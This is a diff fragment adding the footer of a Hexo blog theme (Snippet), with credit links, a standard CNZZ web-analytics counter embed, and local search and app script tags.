+                <span>
+                    Powered by <a href="//hexo.io" class="copyright-links" target="_blank" rel="nofollow">Hexo</a>
+                </span> | 
+                <span>
+                    Theme by <a href="//github.com/shenliyang/hexo-theme-snippet.git" class="copyright-links" target="_blank" rel="nofollow">Snippet</a>
+                </span> |
+				<span>
+				<script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_1272924949'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s19.cnzz.com/z_stat.php%3Fid%3D1272924949%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));</script></span>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+	<script src="/js/search.js?rev=@@hash"></script>
+
+
+<script src="/js/app.js?rev=@@hash"></script>
+
+
+</body>
+</html>
